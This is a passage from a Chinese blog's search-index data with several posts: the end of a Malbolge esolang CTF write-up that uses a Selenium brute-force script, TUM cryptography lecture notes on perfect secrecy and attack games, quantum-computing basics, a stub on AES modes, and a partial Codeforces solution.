execute_button.click() # 等待执行完成并获取Output内容 time.sleep(1) # 根据需要调整等待时间 output_div = driver.find_element(By.ID, &quot;output&quot;) output_content = output_div.text # 仅当output内容包含&quot;flag&quot;时打印结果 if &quot;pp&#123;&quot; in output_content.lower(): print(f&quot;将第 &#123;i + 1&#125; 位修改成 &#x27;&#123;char&#125;&#x27; 后成功编译出flag。&quot;) print(f&quot;编译成功的代码: &#123;modified_code&#125;&quot;) found_flag = True # 设置标志变量，标记已找到结果 break # 退出内层循环finally: # 关闭浏览器 driver.quit()# 运行成功后会得到：&quot;&quot;&quot;将第 43 位修改成 &#x27;p&#x27; 后成功编译出flag。编译成功的代码: ojii&lt;vvj/io//jov/o/&lt;/p**&lt;i/pjvo&lt;/&lt;pjp&lt;*iv&lt;p*poopp&lt;&lt;oo*oop&lt;o**oooop&lt;ppp&lt;opooooop&lt;ooop&lt;ppppop&lt;oooppppop&lt;ooppp&lt;oo**p&lt;poppp&lt;o*oppp&lt;o*poop&lt;ppooopp&lt;*ppp&lt;*opop&lt;o*oooop&lt;oooop*p&lt;ooppp&lt;ooooop&lt;ooooo*p&lt;p*poppp&lt;v&quot;&quot;&quot; 修改解释器源代码有一位参赛选手分享了一个非常巧妙的解法，具体如下：首先他找到了一个用 C 语言编写的原始 Malbolge 解释器（https://github.com/bipinu/malbolge）。接着，他将第 131 行的return 改为 break，以避免 exec() 函数提前结束。最后，他使用修改后的解释器运行题目中提供的 Malbolge 代码，成功得到了 flag。 工具（网站）最后附上一些网页，可以用来生成，编译，或者debug。 https://lutter.cc/malbolge/debugger.html https://zb3.me/malbolge-tools/#generator https://tio.run/##y03MScrPSU/9/19DXU3VyjJWsa62psoorKK8TFcnwL@wID8vR8UjKzMjrcbJwcFOx9bG18pSzTxSOSzMKCQ4T88/VSvZWsNTTVVFWSnX2cnRvqqiokwrIMkioTDfxCg3yk2v2rNSyyHFRd3GOt5eMaYWYnpwcOD//wA","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Malbolge","slug":"Malbolge","permalink":"https://archer-baiyi.github.io/tags/Malbolge/"}]},{"title":"密码学 Kryptografie","slug":"TUM info 笔记/密码学/密码学基础","date":"2025-04-24T19:45:04.000Z","updated":"2025-05-04T15:00:06.518Z","comments":true,"path":"2025/04/24/TUM info 笔记/密码学/密码学基础/","permalink":"https://archer-baiyi.github.io/2025/04/24/TUM%20info%20%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/","excerpt":"密码学相关笔记","text":"Basics我们首先来看一下Shannon是如何定义加密的： Schannon cipher 是一个加密方案（encryption scheme）$\\Pi := (E,D)$ ，作用于$(\\mathcal{K},\\mathcal{M},\\mathcal{C})$上，其中： $\\mathcal{K}$ 是一个有限的加密密钥集合。 $\\mathcal{M}$ 是一个有限的消息集合。 $\\mathcal{C}$ 是一个有限的密文集合。 $E: \\mathcal{K} \\times \\mathcal{M} \\to \\mathcal{C}$ 是加密函数。 $D: \\mathcal{K} \\times \\mathcal{C} \\to \\mathcal{M}$ 是解密函数。 并且满足Correctness property：$\\forall k \\in \\mathcal{K},\\ m \\in \\mathcal{M} :\\ D(k, E(k, m)) = m$。 我们来看一个很简单的例子：One-time-pad (OTP)。 $\\mathcal{K} = \\mathcal{M} = \\mathcal{C} := \\{0,1\\}^L$ with $L$ as a fixed length $\\geq 1$. $E(k, m) := k \\oplus m$ $D(k, c) := k \\oplus c$ （这里的$\\oplus$表示的是xor运算。） 注意到： D(k, E(k, m)) = D(k, k \\oplus m) = k \\oplus (k \\oplus m) = (k \\oplus k) \\oplus m = 0^L \\oplus m = m所以OPT是一个Schannon cipher。 Definition 1: (Perfect Ciphertext Indistinguishability / perfect secrecy / perfect security)一个定义在 $(\\mathcal{K}, \\mathcal{M}, \\mathcal{C})$ 上的 Shannon cipher $\\Pi = (E, D)$，满足密文完全不可区分（has perfectly indistinguishable ciphertexts）（或者说是绝对安全 perfectly secure的），当\\forall m_0, m_1 \\in \\mathcal{M},\\ c \\in \\mathcal{C} :\\ \\Pr[E(k, m_0) = c] = \\Pr[E(k, m_1) = c].其中概率是针对密钥的分布而言，$k$ 是一个随机变量。 我们会假设每个密钥 $k$ 都是从 $\\mathcal{K}$ 里uniformly挑选的，即每个密钥被挑选的概率都等于 $\\frac{1}{\\mathcal{K}}$。 设 N_{m, c} = \\left| \\left\\{ k \\in \\mathcal{K} : E(k, m) = c \\right\\} \\right|为可以将m加密成c的密钥数量，那么我们可以将定义里的等式重新重新表述为： \\forall m_0, m_1 \\in \\mathcal{M},\\ c \\in \\mathcal{C} :\\ N_{m_0, c} = N_{m_1, c}也就是说对于任意2个明文和1个密文，都存在同样多的密钥可以将这两段密文都加密成这段密文。 Theorem 1:The one-time pad (OTP) is perfectly secure. 证明： Given an OTP, for all $m \\in \\mathcal{M}$ there is exactly one unique $k \\in \\mathcal{K}$ such that $E(k, m) = c$. It follows that $N_{m,c} = 1$，因为 存在：There is at least one key $k := c \\oplus m$ with $E(c \\oplus m, m) = c \\oplus m \\oplus m = c$. 唯一：Assuming two keys $k_0, k_1 \\in \\mathcal{K}$ exist where $E(k_0, m) = E(k_1, m) = c$: \\begin{aligned} E(k_0, m) &= E(k_1, m) \\\\ k_0 \\oplus m &= k_1 \\oplus m \\\\ k_0 \\oplus m \\oplus m &= k_1 \\oplus m \\oplus m \\\\ k_0 &= k_1 \\end{aligned}所以有： \\forall m_0, m_1 \\in \\mathcal{M}, c \\in \\mathcal{C} : N_{m_0, c} = N_{m_1, c}=1. $\\square$ Theorem 2: 如果$\\Pi = (E, D)$是绝对安全的（perfectly secure），那么有 $|\\mathcal{K}| \\geq |\\mathcal{M}|$。 证明： 我们假设 $|\\mathcal{K}| &lt; |\\mathcal{M}|$，并任意选择一段明文$m_0$和一个密钥$k’$。设$c := E(k’,m_0)$，那么有 Pr[E(k,m_0)=c] > 0设 S = \\{ D(\\hat{k},c) \\in \\mathcal{M}: \\hat{k} \\in \\mathcal{K} \\}为c所有可能的解密结果。选择$m_1\\in \\mathcal{M}\\backslash S$ （这个集合非空是因为 $|S| \\leq |\\mathcal{K}| &lt; |\\mathcal{M}|$），那么就有 0 < \\Pr[E(k, m_0) = c] \\ne \\Pr[E(k, m_1) = c] = 0a contradiction. $\\square$ 该如何理解这个定理呢？ 其主要说明的就是当密钥空间小于信息空间时，可能会对于有些密文只存在一个（可能的）对应的明文。 然而在实际情况里，一直要求密钥空间大于信息空间其实不太现实，因为我们需要各方各面都传输大量的信息。这就导致Shannon提出来的这个perfect secrecy概念不够实用（practical）。 其根本的原因是，shannon提出来的概念着重于杜绝所有潜在的威胁。但实际上对我们来说，有些威胁是可以接受的：比如说质因数分解很大的数需要大量的计算资源与时间，对我们很难造成什么实质性的威胁。又或者是我运气够好，可以一下子猜到密码。 所以说我们实际追求的是无法以不可忽略的（non-negligible）概率被高效（efficiently）破解的高效加密算法，。 What we would like to have are efficient encryption schemes that cannot be broken “efficiently” with a “non-negligible” probability. 比如说质因数分解，它的理论成功概率很高，但是效率非常低，所以可以被忽视。而猜密码这种方法的成功概率太低了，所以也不需要理会。 重新表述一下就是：“不存在一个算法可以在时间T内以p的概率成功破解我们的加密算法”。 Definition 2 (Polynomially-bounded):A function $f : \\mathbb{Z}_+ \\to \\mathbb{R}$ is called polynomially-bounded if there exist $c, n_0 \\in \\mathbb{N}$ such that for all integers $n \\geq n_0$, we have |f(n)| \\leq n^c \\quad (f(n) \\in \\mathcal{O}(n^c)). Definition 3 (PPT algorithm):An algorithm is called efficient, if its runtime as a function of its input length is polynomially-bounded. We call this algorithm a probabilistic polynomial time (PPT) algorithm. 就其实efficient和PPT是一个意思。 Definition 4 (Efficiently sampleable):A set $S$ is efficiently sampleable if there is a PPT-algorithm that is able to sample an element from it uniformly and randomly.For such a sampling, we use the notation $s \\xleftarrow{R} S$. Definition 5 (Negligible):A function f: \\mathbb{Z}_+ \\to \\mathbb{R}is called negligible if \\forall c \\in \\mathbb{N} \\ \\exists n_0 \\in \\mathbb{Z}_+ \\ \\text{ s.t. for all integers } n \\geq n_0 :|f(n)| \\leq \\frac{1}{n^c} \\quad \\left(f(n) \\in \\mathcal{O}\\left(\\frac{1}{n^c}\\right)\\right). $f$的值会无限小。 例子：$\\frac{1}{2^n},\\quad \\frac{1}{n^{\\log n}}$，the probability of randomly choosing a specific key from a set of $2^n$ $n$-bit keys Definition 6 (Super-poly):A function $f : \\mathbb{Z}_+ \\to \\mathbb{R}$ is called super-poly if $\\frac{1}{f}$ is negligible. 翻译一下： 对于所有的 $c \\in \\mathbb{N}$ 都存在一个 $n_0 \\in \\mathbb{Z}_+$使得 for all integers $n \\geq n_0$, we have ： \\begin{align*} |\\frac{1}{f(n)}| &\\leq \\frac{1}{n^c} \\\\ \\Leftrightarrow f(n) &\\geq n^c \\end{align*}例子：The runtime of an algorithm enumerating all $n$-bit keys to possible ciphertexts for a message $m$ by calculating $E(k, m)$ for all $2^n$ keys is super-poly. Let $c \\in \\mathbb{R}_+$ be a constant, f_{neg}, g_{neg}be negligible functions, f_{poly}, g_{poly}be polynomially-bounded functions, and f_{spoly}, g_{spoly}be super-polynomial functions. Then: 通常我们会定义2个参数： Security parameter $\\lambda$: A positive integer. System parameter $\\Lambda$: A bit string. $\\lambda$ is chosen when a cipher is deployed. 一般来说，$\\lambda$ 的值越大，密码系统的安全等级越高。较高的值通常与较长的密钥相关联，同时对加解密操作 $D$ 和 $E$ 的性能带来负面影响。 而$\\Lambda$ is not chosen but determined by $\\lambda$ for a specific cipher. 比如说，$\\lambda$可能表示模数 $n$ 的位长度（length in bits），$n$本身则为成为System parameter$\\Lambda$。 这两个参数都是公开的。 The parameterization applies the key, message and ciphertext spaces \\{\\mathcal{K}_{\\lambda, \\Lambda}\\}_{\\lambda, \\Lambda},\\quad \\{\\mathcal{M}_{\\lambda, \\Lambda}\\}_{\\lambda, \\Lambda},\\quad \\{\\mathcal{C}_{\\lambda, \\Lambda}\\}_{\\lambda, \\Lambda} Definition 7 (efficient algorithm):Let $A$ be an algorithm that takes as input a security parameter $\\lambda \\in \\mathbb{Z}_{\\geq 1}$, as well as other parameters encoded as a bit string $x \\in \\{0,1\\}^{\\leq p(\\lambda)}$ for some fixed polynomial $p$.We call $A$ an efficient algorithm if there exist a poly-bounded function $t$ and a negligible function $\\epsilon$such that for all $\\lambda$ and $x$, the probability that the running time of $A$ on input $(\\lambda, x)$ exceeds $t(\\lambda)$ is at most $\\epsilon(\\lambda)$. 翻译一下：A的输入为一个 security parameter $\\lambda \\in \\mathbb{Z}_{\\geq 1}$, 以及被 encoded as a bit string $x \\in \\{0,1\\}^{\\leq p(\\lambda)}$ （for some fixed polynomial $p$）的其他的parameters。 Definition 8 (computational cipher):A computational cipher is a pair of efficient algorithms $\\Pi := (E,D)$ such that:$k \\in \\mathcal{K}$ is an encryption key.$m \\in \\mathcal{M}$ is a message.$c \\in \\mathcal{C}$ is a ciphertext.$E : \\mathcal{K} \\times \\mathcal{M} \\rightarrow \\mathcal{C}$ is the encryption algorithm.$D : \\mathcal{K} \\times \\mathcal{C} \\rightarrow \\mathcal{M}$ is the decryption algorithm.$\\mathcal{K}, \\mathcal{M}$ and $\\mathcal{C}$ are finite spaces. computational cipher的定义其实和Shannon cipher就只差了一个 efficient algorithms 的条件。 当然在现实生活中，传输数据时会产生各种随机的噪音，所以$E$ 可以是 non-deterministic。在这种情况下我们会引入一个新的参数randomness：$r \\in \\mathcal{R}$ ，并且用 c \\xleftarrow{R} E(k, m) \\quad\\text{ or }\\quad r \\xleftarrow{R} \\mathcal{R} \\quad\\text{ or }\\quad c \\leftarrow E(k, m; r)表示（受随机数的影响的）加密后的结果。 （这里箭头上的$R$就只是表面当前考虑的是受随机数的影响的加密） 而correctness requirement也需要随之改写成： \\forall c \\xleftarrow{R} E(k, m) : D(k, c) = m（即就算受随机数的影响，也需要可以成功解密出来。感觉跟coding theory很像。） 当$E$ 是 deterministic 的时候，我们会把$\\Pi = (E,D)$ 叫作 deterministic cipher。（比如说OTP） 一个deterministic cipher显然是Shannon cipher。 之前我们定义的 Perfect Ciphertext Indistinguishability 是这样的： \\forall m_0, m_1 \\in \\mathcal{M},\\ c \\in \\mathcal{C} :\\ \\Pr[E(k, m_0) = c] = \\Pr[E(k, m_1) = c].而我们希望将这个定义推广到可以适应所有的 predicate $\\phi$（一个判断函数，输出结果只为true或者false。也就是一个从$\\mathcal{C}$ 映射到$\\{0,1\\}$的函数。比如说判断“密文的前4位是否全为0”。）： \\forall \\phi \\in \\{0,1\\}^{\\mathcal{C}},\\ m_0, m_1 \\in \\mathcal{M}:\\ \\Pr[\\phi(E(k, m_0))] = \\Pr[\\phi(E(k, m_1))]给这个式子引入一个误差（a negligible chance for an adversary to break our scheme by demanding）就会变成： \\forall \\phi \\in \\{0,1\\}^{\\mathcal{C}},\\ m_0, m_1 \\in \\mathcal{M}:\\ |\\Pr[\\phi(E(k, m_0))] - \\Pr[\\phi(E(k, m_1))]| \\leq \\epsilon这个便是Statistical Ciphertext Indistinguishability的定义。 而所谓的Computational Ciphertext Indistinguishability便是在此基础上继续要求 predicate $\\phi$ 是efficient。 Attack Game我们通常会用一个Attack Game来形式化定义安全性。会有一个Adversary $\\mathcal{A}$，如果他的输出不同于任何”trivial attack”（比如说随机猜测），那么我们就说他破解（break）了我们的加密。我们会用$\\mathcal{A}$’s advantage 来衡量他对我们的加密有多大的影响。 Attack Game 1 (Ciphertext Indistinguishability):For a given cipher $\\Pi = (E, D)$ defined over $(\\mathcal{K}, \\mathcal{M}, \\mathcal{C})$ and for a given adversary $\\mathcal{A}$, we define two experiments.For $b \\in \\{0,1\\}$, Experiment $b$ proceeds as follows:The adversary computes $m_0, m_1 \\in \\mathcal{M}$ of the same length and sends them to a challenger.The challenger computes k \\xleftarrow{R} \\mathcal{K},c \\xleftarrow{R} E(k, m_b)and sends $c$ to the adversary.The adversary outputs a bit $\\hat{b} \\in \\{0,1\\}$.Let $W_b$ be the event that $\\mathcal{A}$ outputs 1.（$\\mathcal{A}$在实验b的时候输出1） 图示： Definition:We define $\\mathcal{A}$’s ciphertext distinguishing advantage or semantic security advantage asSCadv[\\mathcal{A}, \\Pi] := |\\Pr[W_0] - \\Pr[W_1]| Definition 9 (Ciphertext Indistinguishability):A cipher $\\Pi := (E, D)$ has (computationally) indistinguishable ciphertexts,if $SC_{adv}[\\mathcal{A}, \\Pi]$ is negligible for all PPT adversaries $\\mathcal{A}$. 如果对于所有adversaries $\\mathcal{A}$都有： SC_{adv}[\\mathcal{A}, \\Pi] = 0那么它一定是(computationally) indistinguishable ciphertexts。 例子： Trivial attacks 如果$\\mathcal{A}$永远输出1，那么 SCadv[\\mathcal{A}, \\Pi] := |\\Pr[W_0] - \\Pr[W_1]| = |1-1| = 0 如果$\\mathcal{A}$通过扔硬币选择输出，那么 SCadv[\\mathcal{A}, \\Pi] := |\\Pr[W_0] - \\Pr[W_1]| = |\\frac{1}{2} - \\frac{1}{2}| = 0 如果挑选2条一样的明文，那么advantage也等于0，因为不可能通过任何手段可以判断出来到底加密的是哪条信息，所以只能猜，也就是$|\\frac{1}{2} - \\frac{1}{2}| = 0$。 假如这样设计一个加密：$E(k, m) := (\\text{parity}(m), E’(k, m))$，即加密结果包含2个信息，第一个是明文$m$的奇偶性，第二个是真正的加密内容，那么就会存在一个 adversary with advantage 1： $\\mathcal{A}$挑选2个明文，一个的parity等于1，一个的等于0.那么他就可以通过$E(k, m)$的第一个component的值（parity）来判断明文到底是那条。 对于perfectly secure ciphers，所有的adversary has advantage 0 。 如果我们让challenger随机挑选b，那么就会得到下面这种attack game： Attack Game 2 (Ciphertext Indistinguishability — bit guessing) :For a given cipher $\\Pi = (E, D)$ defined over $(\\mathcal{K}, \\mathcal{M}, \\mathcal{C})$ and for a given adversary $\\mathcal{A}$, the experiment proceeds as follows:The adversary computes $m_0, m_1 \\in \\mathcal{M}$ of the same length and sends them to a challenger.The challenger computes $b \\xleftarrow{R} \\{0,1\\}$, $k \\xleftarrow{R} \\mathcal{K}$, $c \\xleftarrow{R} E(k, m_b)$The adversary outputs a bit $\\hat{b} \\in \\{0,1\\}$Let $W$ be the event that $\\hat{b} = b$ 图示： Definition:We define $\\mathcal{A}$’s bit-guessing advantage as:SCadv^*[\\mathcal{A}, \\Pi] := |\\Pr[W] - \\tfrac{1}{2}| Lemma:SCadv^*[\\mathcal{A}] = \\frac{1}{2}SCadv[\\mathcal{A}] 证明： 因为b是随机挑选的，所以 \\text{Pr}[b = 0] = \\text{Pr}[b = 1] = \\frac{1}{2}那么有 \\begin{align*} \\text{Pr}[W] &= \\text{Pr}[\\hat{b} = b] \\\\ &= \\text{Pr}[\\hat{b} = b \\mid b = 0] \\cdot \\text{Pr}[b = 0] + \\text{Pr}[\\hat{b} = b \\mid b = 1] \\cdot \\text{Pr}[b = 1] \\\\ &= \\frac{1}{2} \\cdot \\left( \\text{Pr}[\\hat{b} = 0 \\mid b = 0] + \\text{Pr}[\\hat{b} = 1 \\mid b = 1] \\right) \\end{align*}根据之前$W_0,W_1$的定义可以得到： \\text{Pr}[\\hat{b} = 0 \\mid b = 0] = 1 - \\text{Pr}[\\hat{b} = 1 \\mid b = 0] = 1 - \\text{Pr}[W_0] \\text{Pr}[\\hat{b} = 1 \\mid b = 1] = \\text{Pr}[W_1]所以： \\begin{align*} SCadv^*[\\mathcal{A}, \\Pi] &= \\left| \\text{Pr}[W] - \\frac{1}{2} \\right| \\\\ &= \\left| \\frac{1}{2} \\cdot (1 - \\text{Pr}[W_0] + \\text{Pr}[W_1]) - \\frac{1}{2} \\right| \\\\ &= \\frac{1}{2} \\cdot \\left| \\text{Pr}[W_1] - \\text{Pr}[W_0] \\right| \\\\ &= \\frac{1}{2} \\cdot SCadv[\\mathcal{A}, \\Pi] \\end{align*}. $\\square$ Theorem 3:The one-time pad （OTP） has indistinguishable ciphertexts. 证明： 我们用bit-guessing game来证明这个thm。 Let $\\mathcal{A}$ be any adversary. Assume it outputs messages $m_0, m_1 \\in \\{0,1\\}^L$ for some length $L$. Since $k$ is randomly chosen, $m_b \\oplus k$ is a uniformly random bitstring of length $L$, independent of $b$. 所以说只能随机猜测b。 所以 SCadv^*[\\mathcal{A}, \\Pi_{\\text{OTP}}] = | \\text{Pr}[W] - \\frac{1}{2} | =| \\text{Pr}[b = \\hat{b}] - \\frac{1}{2} |= 0.$\\square$ Secret key cryptographyDefinition 10 (Pseudo-random generator):A pseudo-random generator (PRG) is an efficiently computable function G : \\mathcal{S} \\to \\mathcal{R}where:$|\\mathcal{S}| &lt; |\\mathcal{R}|$$\\mathcal{S}$ (usually $\\{0,1\\}^l$) is called the seed space.$\\mathcal{R}$ (usually $\\{0,1\\}^L$, $L &gt; l$) is called the output space. 我们可以继续哟个attack game来formalize “random”的概念。 Attack Game 3 (PRG advantage):For a given PRG $G$ defined over $(\\mathcal{S}, \\mathcal{R})$ and for a given adversary $\\mathcal{A}$, we define two experiments.For $b = 0,1$, Experiment $b$ proceeds as follows:The challenger computes $r \\in \\mathcal{R}$ as follows and sends it to $\\mathcal{A}$:if $b = 0$: $s \\xleftarrow{R} \\mathcal{S},\\ r \\leftarrow G(s)$if $b = 1$: $r \\xleftarrow{R} \\mathcal{R}$The adversary outputs a bit $\\hat{b} \\in \\{0,1\\}$Let $W_b$ be the event that $\\mathcal{A}$ outputs 1 图示： Definition:we define $\\mathcal{A}$’s PRG distinguishing advantage as:PRGadv[\\mathcal{A}, G] := |\\Pr[W_0] - \\Pr[W_1]| Definition 11 (Secure PRG):A PRG $G$ is secure, if $PRGadv[\\mathcal{A}, G]$ is negligible for all PPT adversaries $\\mathcal{A}$. Definition 12 (Stream Cipher Construction):Given a PRG $G : \\mathcal{K} \\to \\{0,1\\}^L$, we define the basic stream cipher $\\Pi = (E, D)$ over$(\\mathcal{K}, \\{0,1\\}^L, \\{0,1\\}^L)$ as follows:$E(k, m) := G(k) \\oplus m$$D(k, c) := G(k) \\oplus c$","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"密码学 Kryptografie","slug":"TUM-info-课程笔记/密码学-Kryptografie","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6-Kryptografie/"}],"tags":[{"name":"密码学","slug":"密码学","permalink":"https://archer-baiyi.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"量子计算入门","slug":"TUM info 笔记/量子计算/量子计算入门","date":"2025-04-20T13:40:00.000Z","updated":"2025-04-26T18:31:26.179Z","comments":true,"path":"2025/04/20/TUM info 笔记/量子计算/量子计算入门/","permalink":"https://archer-baiyi.github.io/2025/04/20/TUM%20info%20%E7%AC%94%E8%AE%B0/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97%E5%85%A5%E9%97%A8/","excerpt":"量子计算入门","text":"Introduction基本概念量子比特（Quantum bits, qubits）普通的比特（bit）只能取两种离散值：0和1。 而量子比特（Quantum bits, qubits）则是处于0和1的叠加态（superposition）：一个量子比特的一般态（quantum state）$|\\psi\\rangle$ 一般写作： |\\psi\\rangle = \\alpha\\,|0\\rangle + \\beta\\,|1\\rangle, \\ \\ \\alpha,\\beta \\in \\mathbb{C}满足 |\\alpha|^2 + |\\beta|^2 = 1 这里的符号 $|\\psi\\rangle$ 叫做 Ket-notation。 我们可以将$|0\\rangle,|1\\rangle$ 当成一个basis，然后将qubit的所有状态看成是一个二维空间的子集，所以我们也可以写成 |\\psi\\rangle = \\begin{pmatrix} \\alpha \\\\ \\beta \\end{pmatrix}当然，在量子比特被观测时，我们只会得到0或者1的结果。其中观测到0的概率为 $|\\alpha|^2$，观测到1的概率为 $|\\beta|^2$。观测行为本身也会改变qubit。如果观测到0，那么qubit会变成 $|\\psi\\rangle = |0\\rangle$，如果观测到1，那么qubit会变成 $|\\psi\\rangle = |1\\rangle$。 需要注意的是我们无法直接观测到一个量子比特的状态，即无法直接测量$\\alpha$和$\\beta$的值。 当然我们还可以用其他方法来表示量子比特： 因为$|\\alpha|^2 + |\\beta|^2 = 1$，所以当$\\alpha$和$\\beta$是实数时，一定存在一个$\\theta\\in \\mathbb{R}$ 使得： \\alpha = cos(\\frac{\\theta}{2}) , \\ \\ \\beta = sin(\\frac{\\theta}{2})推广到复数便可以得到：（因为每个复数都可以写成极坐标的形式： $c = re^{i\\gamma} = |c| \\cdot e^{i\\gamma}$） \\alpha = e^{i\\gamma} cos(\\frac{\\theta}{2}) , \\ \\ \\beta = e^{i(\\gamma + \\varphi)}sin(\\frac{\\theta}{2})因此我们可以将$|\\psi\\rangle$写成： \\begin{align} |\\psi\\rangle &= e^{i\\gamma} cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i(\\gamma + \\varphi)}sin(\\frac{\\theta}{2}) \\\\ &= e^{i\\gamma}\\Bigl(cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i\\varphi}sin(\\frac{\\theta}{2})\\Bigl) \\end{align}其中$ \\theta \\in [0, \\pi],\\quad \\varphi, \\gamma \\in [0, 2\\pi)$。 由于$e^{i\\gamma}$对我们来说并不重要（后面会详细讲），所以一个qubit实际上只需要2个实数参数（$\\theta, \\varphi$）。由此每个qubit都对应 Bloch Sphere 的surface上的一个点： r = \\begin{pmatrix} cos(\\varphi)sin(\\theta)\\\\ sin(\\varphi)sin(\\theta)\\\\ cos(\\theta) \\end{pmatrix}Bloch Sphere： 注意，$|0\\rangle$和$|1\\rangle$对应的$\\theta$的值分别为0和$\\pi$，所以他们对应Bloch Sphere的2个极点（poles）。 单量子比特门（Single qubit gate）我们一般用一个complex unitary matrix U来表示qubit的状态变化： |\\psi\\rangle' = U \\cdot |\\psi\\rangle对应的电路图一般这样画： 下面来看一些例子： 以下3个（X,Y,Z）叫做Pauli matrices: Pauli-X gate: X = \\sigma_1 = \\begin{pmatrix} 0 & 1 \\\\ 1 & 0 \\end{pmatrix}注意到： X|0\\rangle = \\begin{pmatrix} 0 & 1 \\\\ 1 & 0 \\end{pmatrix} \\cdot \\begin{pmatrix} 0 \\\\ 1 \\end{pmatrix}= |1\\rangle X|1\\rangle = |0\\ranglePauli-Y gate: Y = \\sigma_2 = \\begin{pmatrix} 0 & -i \\\\ i & 0 \\end{pmatrix}Pauli-Z gate: Z = \\sigma_3 = \\begin{pmatrix} 1 & 0 \\\\ 0 & -1 \\end{pmatrix}注意到Z不会改变$|0\\rangle$，但是会改变$|1\\rangle$的系数的符号： 假设 \\begin{align} Z \\ |\\psi\\rangle &= cos(\\frac{\\theta}{2}) \\ |0\\rangle - e^{i\\varphi}sin(\\frac{\\theta}{2})\\\\ &= cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i\\pi}e^{i\\varphi}sin(\\frac{\\theta}{2})\\\\ &= cos(\\frac{\\theta}{2}) \\ |0\\rangle + e^{i(\\varphi+\\pi)}sin(\\frac{\\theta}{2}) \\end{align}这同样意味着$|\\psi\\rangle $会沿着Z轴旋转$180^\\circ$。 而 Pauli vector 指的则是 $\\sigma = (\\sigma_1,\\sigma_2,\\sigma_3) = (X,Y,Z)$。（a vector of $2\\times 2$ matrices）","categories":[{"name":"TUM info 课程笔记","slug":"TUM-info-课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"量子计算 Quantum Computing","slug":"TUM-info-课程笔记/量子计算-Quantum-Computing","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97-Quantum-Computing/"}],"tags":[{"name":"Quantum Computing","slug":"Quantum-Computing","permalink":"https://archer-baiyi.github.io/tags/Quantum-Computing/"},{"name":"量子计算","slug":"量子计算","permalink":"https://archer-baiyi.github.io/tags/%E9%87%8F%E5%AD%90%E8%AE%A1%E7%AE%97/"}]},{"title":"AES加解密以及攻击方法","slug":"CTF/Crypto/AES加解密以及攻击方法","date":"2025-04-19T18:00:59.000Z","updated":"2025-04-19T18:12:32.582Z","comments":true,"path":"2025/04/19/CTF/Crypto/AES加解密以及攻击方法/","permalink":"https://archer-baiyi.github.io/2025/04/19/CTF/Crypto/AES%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BB%A5%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/","excerpt":"","text":"IntroductionAES-ECBECB的全称为 Electronic Code Book Modus。 攻击明文攻击AES-CBCCBC的全称为 Cipher Block Chaining Modus。 需要一个密钥k以及一个Initialisierungsvektor IV。IV是不需要保密的，很多时候会直接放在密文的开头。 加密： 解密： 攻击Padding OracleAES-CTR这个模式会生成一串密钥流，然后通过与明文进行异或操作进行加密。 一开始需要选择/生成一个随机数Nonce，并初始化计数器（counter/ctr）为0。k为密钥。 加密： 解密：","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"AES","slug":"AES","permalink":"https://archer-baiyi.github.io/tags/AES/"},{"name":"ECB","slug":"ECB","permalink":"https://archer-baiyi.github.io/tags/ECB/"},{"name":"CBC","slug":"CBC","permalink":"https://archer-baiyi.github.io/tags/CBC/"},{"name":"CTR","slug":"CTR","permalink":"https://archer-baiyi.github.io/tags/CTR/"}]},{"title":"Codeforce Raising_Bacteria Task","slug":"算法竞赛/Codeforce/1000/Codeforce-Raising-Bacteria-Task","date":"2025-04-09T06:26:18.000Z","updated":"2025-04-09T06:49:22.141Z","comments":true,"path":"2025/04/09/算法竞赛/Codeforce/1000/Codeforce-Raising-Bacteria-Task/","permalink":"https://archer-baiyi.github.io/2025/04/09/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Raising-Bacteria-Task/","excerpt":"","text":"题目描述 思路这道题主要考察的是对二进制的理解。 假设我们在第 $i$ 天会放入数量为 $x_i$ 的细菌，那么 $n$ 天之后会得到 $\\sum^n_{i=0}x_i \\cdot 2^i$ 。 所以给定一个数 $x$ ，我们需要找到一组 $[x_0,x_1,…,x_n]$ ，使得 $\\sum^n_{i=0}x_i$ 最小，并且 $\\sum^n_{i=0}x_i \\cdot 2^i = x$ ，即 \\underset{[x_0,x_1,...,x_n]}{\\text{min}}\\sum^n_{i=0}x_i \\quad\\text{s.t.} \\sum^n_{i=0}x_i \\cdot 2^i = x假设 $\\sum^n_{i=0}a_i \\cdot 2^i$ 为 $x$ 的二进制展开。我们现在证明 $[a_0,…,a_n]$ 正是这个最优化问题的解： 首先很显然 $[a_0,…,a_n]$ 满足上面的条件（s.t. 的部分）。假设现在存在 $[b_0,…,b_n]$ 使得 $\\sum^n_{i=0}b_i \\cdot 2^i = x$ 并且 